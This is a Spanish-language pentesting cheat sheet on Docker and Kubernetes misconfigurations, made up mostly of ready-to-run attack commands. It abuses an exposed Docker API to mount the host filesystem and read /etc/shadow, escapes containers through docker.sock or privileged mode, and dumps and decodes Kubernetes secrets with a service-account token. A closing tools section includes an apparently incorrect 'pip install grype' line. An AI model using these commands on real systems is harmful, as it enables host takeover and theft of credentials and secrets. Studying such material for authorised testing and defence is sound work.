# Seguridad en Contenedores y Kubernetes

---

## Docker -- Misconfiguraciones

### Docker socket expuesto (critico -> RCE del host)

```bash
# Si la API de Docker esta expuesta sin autenticacion (puerto 2375)
curl http://192.168.1.X:2375/version

# Listar contenedores
curl http://192.168.1.X:2375/containers/json

# Crear contenedor con acceso al host completo
curl -X POST http://192.168.1.X:2375/containers/create     -H "Content-Type: application/json"     -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}]}'
```

### Escape de contenedor (si tenemos acceso a uno)

```bash
# Verificar si somos root dentro del contenedor
whoami; id

# Verificar si el contenedor tiene capacidades peligrosas
cat /proc/self/status | grep CapEff

# Si esta montado el socket de Docker
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host /bin/bash

# Si tiene --privileged
# Montar el disco del host y leer archivos
fdisk -l
mount /dev/sda1 /mnt
cat /mnt/etc/shadow
```

---

## Kubernetes -- Misconfiguraciones

```bash
# Si tenemos acceso al API Server sin autenticacion
curl -k https://kubernetes-api:6443/api/v1/namespaces

# Enumerar con kubectl
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces

# Leer secretos
kubectl get secret NOMBRE -o yaml
echo "BASE64" | base64 -d  # decodificar el valor

# Si el pod tiene Service Account con permisos
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

---

## ECR / GCR / ACR -- Registros de contenedores

```bash
# AWS ECR -- registros de contenedores privados
aws ecr get-login-password --region eu-west-1 | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.eu-west-1.amazonaws.com
aws ecr list-images --repository-name REPO

# Descargar imagen y buscar secretos
docker pull ACCOUNT.dkr.ecr.eu-west-1.amazonaws.com/REPO:latest
docker history ACCOUNT.dkr.ecr.eu-west-1.amazonaws.com/REPO:latest --no-trunc
```

---

## Herramientas

```bash
# Trivy -- escaner de vulnerabilidades en contenedores
apt install trivy
trivy image objetivo/imagen:latest
trivy image --severity HIGH,CRITICAL objetivo/imagen:latest

# Grype -- alternativa a Trivy
pip install grype
grype objetivo/imagen:latest

# kube-bench -- benchmark de seguridad Kubernetes
docker run --rm -v /etc:/etc:ro aquasec/kube-bench
```
